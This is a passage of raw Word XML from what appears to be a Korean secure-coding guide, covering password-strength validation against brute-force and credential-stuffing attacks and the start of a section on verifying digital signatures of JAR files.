                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>초당</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수천</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>회</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>시도하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>브루트포스</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>공격으로</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>수</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>초</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>만에</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>계정이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>탈취됩니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">. </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>동일</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호를</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>사용하는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>다른</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서비스까지</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>연쇄</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>피해</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>(Credential Stuffing)</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>가</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>발생합니다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="E2EFDA"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>안전</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>대소문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숫자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>Pattern p = Pattern.compile(</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    "^(?=.*[a-zA-Z])(?=.*[0-9])(?=.*[!@#$%^&amp;*]).{8,}$"</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>);</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>if (!p.matcher(password).matches()) {</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>throw new Exception("</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>비밀번호는</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>영문</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>+</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>숫자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>+</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>특수문자</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>포함</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> 8</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>자리</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>이상</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>");</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E"/>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">  10. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>부적절한</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>전자서명</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="C00000"/>
          <w:sz w:val="22"/>
        </w:rPr>
        <w:t>확인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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFF2CC"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>준수사항</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="1F3564"/>
                <w:sz w:val="18"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>전자서명을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포함한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파일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사용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시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항상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전자서명을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확인한다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:ind w:left="170"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">• </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>신뢰할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수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없는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출처의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서명된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파일을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사용하지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않는다</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:sz w:val="20"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B30C6E">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="ko-KR"/>
        </w:rPr>
      </w:pP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9122"/>
      </w:tblGrid>
      <w:tr w:rsidR="00B30C6E">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="9122" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FCE4D6"/>
          </w:tcPr>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:spacing w:after="20"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>[</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약한</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>코드</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>예</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="404040"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>]</w:t>
            </w:r>
          </w:p>
          <w:p w:rsidR="00B30C6E" w:rsidRDefault="00B31433">
            <w:pPr>
              <w:ind w:left="113"/>
              <w:rPr>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>// [</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>취약</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve">] </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>서명</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>검증</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>없이</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> JAR </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>파일의</w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
                <w:sz w:val="17"/>
                <w:lang w:eastAsia="ko-KR"/>
              </w:rPr>
              <w:t>클래스</w:t>
